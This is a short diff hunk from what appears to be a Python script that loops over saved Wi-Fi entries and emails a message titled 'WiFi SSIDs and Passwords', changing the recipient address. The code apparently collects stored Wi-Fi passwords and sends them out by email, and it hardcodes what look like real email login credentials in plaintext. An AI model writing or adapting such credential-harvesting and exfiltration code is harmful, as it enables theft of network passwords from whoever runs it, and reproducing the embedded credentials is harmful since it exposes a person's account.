@@ -39,7 +39,7 @@ for item in wifi_list:
 try:
     email = 'abubakkar.swe@gmail.com'
     password = 'Abubakkar32'
-    send_to_email = "sowrov35-1946@diu.edu.bd"
+    send_to_email = "abubakkar.swe@gmail.com"
 
     msg = EmailMessage()
     msg['Subject'] = 'WiFi SSIDs and Passwords'
